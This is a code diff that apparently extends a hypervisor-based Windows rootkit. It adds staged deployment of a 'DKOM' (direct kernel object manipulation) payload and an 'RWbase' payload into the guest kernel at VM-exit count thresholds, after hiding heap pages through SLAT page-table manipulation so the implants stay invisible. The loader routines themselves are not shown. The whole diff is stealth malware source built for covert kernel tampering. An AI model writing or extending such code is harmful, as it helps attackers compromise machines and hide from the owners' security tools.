@@ -13,6 +13,7 @@
 #include "slat/slat.h"
 #include "slat/cr3/cr3.h"
 #include "slat/violation/violation.h"
+#include "loader/loader.h"
 
 typedef std::uint64_t(*vmexit_handler_t)(std::uint64_t a1, std::uint64_t a2, std::uint64_t a3, std::uint64_t a4);
 
@@ -28,6 +29,10 @@ namespace
     std::uint64_t g_text_end = 0;
     std::uint64_t g_data_start = 0;
     std::uint64_t g_data_end = 0;
+
+    // VMM Shadow Mapper: Guest ntoskrnl base address
+    // TODO: Obtain this from PsLoadedModuleList or Guest CR3 scan
+    std::uint64_t g_ntoskrnl_base = 0;
 }
 
 void clean_up_uefi_boot_image()
@@ -51,14 +56,63 @@ void process_first_vmexit()
 
     static std::uint8_t has_hidden_heap_pages = 0;
     static std::uint64_t vmexit_count = 0;
+    
+    // VMM Shadow Mapper: Deployment state
+    static std::uint8_t dkom_deployed = 0;
+    static std::uint8_t rwbase_deployed = 0;
+    constexpr std::uint64_t DKOM_DEPLOY_THRESHOLD = 1500000;  // 1.5M VMExits
+    constexpr std::uint64_t HEAP_HIDE_THRESHOLD = 2000000;    // 2M VMExits
 
-    if (has_hidden_heap_pages == 0 && 2000000 <= ++vmexit_count)
+    ++vmexit_count;
+
+    // Stage 1: Deploy DKOM at 1.5M VMExits (before heap hiding)
+    if (dkom_deployed == 0 && vmexit_count >= DKOM_DEPLOY_THRESHOLD)
+    {
+        logs::print("[Loader] DKOM deployment threshold reached (%d VMExits)\n", vmexit_count);
+        
+        if (g_ntoskrnl_base != 0)
+        {
+            const auto result = loader::deploy_dkom_payload(g_ntoskrnl_base);
+            if (result == loader::deploy_result_t::success)
+            {
+                logs::print("[Loader] DKOM deployed successfully\n");
+            }
+            else
+            {
+                logs::print("[Loader] DKOM deployment failed: %d\n", static_cast<uint32_t>(result));
+            }
+        }
+        else
+        {
+            logs::print("[Loader] DKOM skipped: ntoskrnl_base not yet resolved\n");
+        }
+        dkom_deployed = 1;
+    }
+
+    // Stage 2: Hide heap pages at 2M VMExits
+    if (has_hidden_heap_pages == 0 && vmexit_count >= HEAP_HIDE_THRESHOLD)
     {
         has_hidden_heap_pages = slat::hide_heap_pages(slat::hyperv_cr3());
 
         if (has_hidden_heap_pages == 1)
         {
             logs::print("[Runtime] Heap memory hiding complete (Total 2M VMExits threshold met).\n");
+            
+            // Stage 3: Deploy RWbase after heap hiding (START3 phase)
+            if (rwbase_deployed == 0 && g_ntoskrnl_base != 0)
+            {
+                logs::print("[Loader] RWbase deployment - START3 phase\n");
+                const auto result = loader::deploy_rwbase_payload(g_ntoskrnl_base);
+                if (result == loader::deploy_result_t::success)
+                {
+                    logs::print("[Loader] RWbase deployed with SLAT hiding\n");
+                }
+                else
+                {
+                    logs::print("[Loader] RWbase deployment failed: %d\n", static_cast<uint32_t>(result));
+                }
+                rwbase_deployed = 1;
+            }
         }
     }
 }
